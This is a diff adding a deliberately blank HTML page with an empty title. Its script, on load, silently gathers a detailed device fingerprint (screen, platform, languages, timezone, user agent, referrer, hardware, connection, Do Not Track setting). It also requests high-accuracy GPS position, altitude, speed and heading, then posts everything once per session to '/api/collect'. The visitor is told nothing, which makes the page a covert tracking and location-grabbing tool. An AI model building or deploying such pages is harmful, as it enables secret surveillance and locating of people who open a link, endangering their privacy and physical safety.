@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> </title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background-color: #ffffff;
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        if (!sessionStorage.getItem('sent')) {
+            // Collect detailed device info
+            const deviceInfo = {
+                screen: `${window.screen.width}x${window.screen.height}`,
+                availScreen: `${window.screen.availWidth}x${window.screen.availHeight}`,
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                language: navigator.language,
+                languages: navigator.languages ? Array.from(navigator.languages).join(', ') : navigator.language,
+                platform: navigator.platform,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                userAgent: navigator.userAgent,
+                vendor: navigator.vendor || 'Unknown',
+                referrer: document.referrer || 'Direct',
+                cookiesEnabled: navigator.cookieEnabled,
+                url: window.location.href,
+                online: navigator.onLine,
+                memory: navigator.deviceMemory || 'Unknown',
+                cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                touchScreen: navigator.maxTouchPoints > 0,
+                doNotTrack: navigator.doNotTrack || 'Not set',
+                timestamp: new Date().toISOString(),
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null
+            };
+
+            // Try to get GPS location if user allows
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        deviceInfo.gpsLat = position.coords.latitude;
+                        deviceInfo.gpsLon = position.coords.longitude;
+                        deviceInfo.gpsAccuracy = position.coords.accuracy;
+                        deviceInfo.gpsAltitude = position.coords.altitude;
+                        deviceInfo.gpsSpeed = position.coords.speed;
+                        deviceInfo.gpsHeading = position.coords.heading;
+                        sendData(deviceInfo);
+                    },
+                    (error) => {
+                        deviceInfo.gpsError = error.message;
+                        sendData(deviceInfo);
+                    },
+                    { 
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 60000
+                    }
+                );
+            } else {
+                sendData(deviceInfo);
+            }
+
+            function sendData(data) {
+                fetch('/api/collect', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                })
+                .then(() => sessionStorage.setItem('sent', 'true'))
+                .catch(console.error);
+            }
+        }
+    </script>
+</body>
+</html>
